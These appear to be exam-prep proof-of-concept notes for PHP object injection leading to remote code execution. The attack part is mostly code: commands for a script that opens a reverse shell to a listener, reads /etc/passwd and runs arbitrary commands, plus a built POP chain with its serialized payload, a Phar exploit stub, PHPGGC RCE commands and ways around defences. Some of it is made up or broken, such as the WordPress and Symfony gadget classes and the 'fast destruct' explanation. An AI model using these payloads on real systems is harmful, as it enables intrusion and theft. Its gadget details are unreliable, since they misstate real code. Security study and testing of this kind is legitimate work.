# PHP Object Injection RCE PoC Notes

## Vulnerability Summary
- **Target**: PHP applications using `unserialize()` on untrusted data
- **Type**: PHP Object Injection → POP Chain → RCE
- **Impact**: Remote code execution, file operations, SQL injection

## Key Concepts
PHP magic methods (`__wakeup`, `__destruct`, `__toString`, `__call`) are automatically invoked during object lifecycle. Attackers construct Property-Oriented Programming (POP) chains by linking these magic methods to achieve arbitrary code execution.

## Attack Flow
```
1. Identify Injection Point
   → Find unserialize($_POST['data'])
   → Find unserialize($_COOKIE['session'])
   → Find unserialize(base64_decode($_GET['obj']))

2. Analyze Available Classes
   → Find classes with dangerous magic methods
   → __destruct() → file operations, eval()
   → __toString() → SQL queries, command execution
   → __wakeup() → initialization with user input

3. Build POP Chain
   → Start from injection point
   → Chain __destruct → __toString → exec()
   → Each step passes controlled data to next

4. Generate Payload
   → Serialize malicious object
   → Encode (base64, urlencode, etc.)
   → Send to application

5. Trigger Unserialization
   → Magic methods execute automatically
   → Payload chain runs
   → Achieve RCE
```

## Quick Usage
```bash
# Analyze classes and build chain
python3 poc_php_object_injection.py \
  --target-ip 192.168.1.10 \
  --target-port 80 \
  --analyze-only

# Execute reverse shell
python3 poc_php_object_injection.py \
  --target-ip 192.168.1.10 \
  --target-port 80 \
  --listening-ip 10.10.14.5 \
  --listening-port 4444 \
  --command revshell

# Read arbitrary file
python3 poc_php_object_injection.py \
  --target-ip 192.168.1.10 \
  --target-port 80 \
  --command read_file \
  --file /etc/passwd

# Execute custom command
python3 poc_php_object_injection.py \
  --target-ip 192.168.1.10 \
  --target-port 80 \
  --command exec \
  --exec-cmd "whoami"

# With Burp proxy for debugging
python3 poc_php_object_injection.py \
  --target-ip 192.168.1.10 \
  --proxy http://127.0.0.1:8080 \
  --verbose
```

## Finding Injection Points

### Common Patterns
```php
// Direct unserialize
data = unserialize($_POST['data']);

// Base64 encoded
$data = unserialize(base64_decode($_COOKIE['session']));

// With object allowed classes
$data = unserialize($input, ['allowed_classes' => ['Model', 'View']]);

// In caching systems
$cache = unserialize(file_get_contents($cache_file));
```

### Magic Methods to Target

#### __destruct()
```php
// File deletion
class TempFile {
    private $file;
    function __destruct() {
        unlink($this->file);  // Controlled deletion
    }
}

// Command execution
class Logger {
    private $log_file;
    function __destruct() {
        system("rm " . $this->log_file);  // Command injection
    }
}
```

#### __toString()
```php
// SQL Injection
class User {
    private $id;
    function __toString() {
        return "SELECT * FROM users WHERE id=" . $this->id;
    }
}

// File inclusion
class Template {
    private $template;
    function __toString() {
        return file_get_contents($this->template);
    }
}
```

#### __wakeup()
```php
// Initialization with user input
class Config {
    private $settings;
    function __wakeup() {
        file_put_contents('/tmp/config', $this->settings);
    }
}
```

## Building POP Chains

### Example Chain
```php
// Class 1: Entry point
class FileHandler {
    public $file;
    function __destruct() {
        file_get_contents($this->file);
    }
}

// Class 2: String conversion for SQL
class User {
    public $id;
    public $name;
    function __toString() {
        return "User: " . $this->name;
    }
}

// Class 3: Execute command
class SystemCommand {
    public $cmd;
    function __toString() {
        return system($this->cmd);
    }
}
```

### Chain Construction
```php
// Build chain
$payload = new FileHandler();
$payload->file = new User();
$payload->file->name = new SystemCommand();
$payload->file->name->cmd = "id";

// Serialize
$serialized = serialize($payload);
// O:11:"FileHandler":1:{s:4:"file";O:4:"User":2:{s:2:"id";N;s:4:"name";O:13:"SystemCommand":1:{s:3:"cmd";s:2:"id";}}}
```

## Common POP Gadgets

### WordPress (Generic)
```php
// File deletion via __destruct
class WP_SQLite_DB {
    public $db;
    function __destruct() {
        unlink($this->db);
    }
}

// RCE via __toString
class WP_Query {
    public $query;
    function __toString() {
        eval($this->query);
    }
}
```

### Laravel
```php
// RCE via PendingBroadcast
class PendingBroadcast {
    protected $events;
    protected $event;
    
    function __destruct() {
        $this->events->dispatch($this->event);
    }
}
```

### Symfony
```php
// RCE via Stringable
class Stringable {
    private $str;
    function __toString() {
        return call_user_func($this->str);
    }
}
```

## OSWE Exam Tips

### Source Code Analysis
1. **Search for unserialize()**:
   ```bash
   grep -r "unserialize(" --include="*.php" .
   grep -r "base64_decode.*unserialize" --include="*.php" .
   ```

2. **Find magic methods**:
   ```bash
   grep -r "function __destruct\|function __wakeup\|function __toString" --include="*.php" .
   ```

3. **Map class relationships**:
   ```bash
   grep -r "class.*extends\|class.*implements" --include="*.php" .
   ```

### Chain Building Strategy
1. **Start from __destruct** - always called on object destruction
2. **Work backwards** - find what leads to your target action
3. **Check property visibility** - private/protected need special handling
4. **Test incrementally** - verify each step of the chain

### Payload Encoding
```php
// Standard serialization
$payload = serialize($object);

// Base64 encoding (common in cookies)
$payload = base64_encode(serialize($object));

// URL encoding
$payload = urlencode(serialize($object));

// Array wrapping
$payload = serialize([$object]);
```

### Bypassing allowed_classes
```php
// If allowed_classes restricts object types
// Use native PHP classes that implement Serializable

// Example: ArrayObject
$payload = new ArrayObject(['cmd' => 'id']);
serialize($payload);
```

## Defense Bypasses

### Private/Protected Properties
```php
// Private property syntax in serialization
// \x00ClassName\x00propertyName

// Protected property syntax
// \x00*\x00propertyName
```

### Fast Destruct Bypass
```php
// If __destruct is blocked, use reference
$a = new ExploitClass();
$b = &$a;
unset($a);  // $b still holds reference
```

### Phar Deserialization
```php
// Alternative to direct unserialize()
// Upload .phar file, trigger via file operations
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($payload);
$phar->stopBuffering();
```

## Tools

### PHPGGC (PHP Generic Gadget Chains)
```bash
# Generate Laravel RCE payload
./phpggc Laravel/RCE1 system id

# Generate Symfony RCE payload
./phpggc Symfony/RCE2 exec id

# Generate WordPress payload
./phpggc WordPress/RCE1 system id
```

### Manual Analysis Script
```python
# Parse PHP files to find magic methods
import re
import os

def find_magic_methods(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.php'):
                with open(os.path.join(root, file)) as f:
                    content = f.read()
                    # Find classes with magic methods
                    if '__destruct' in content or '__wakeup' in content:
                        print(f"Found in: {file}")
```

## References
- OWASP: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- PHPGGC: https://github.com/ambionics/phpggc
- POP Chain Construction: https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf
- BlackHat Paper: https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-PHP-Deserialization-Vulnerabilities.pdf
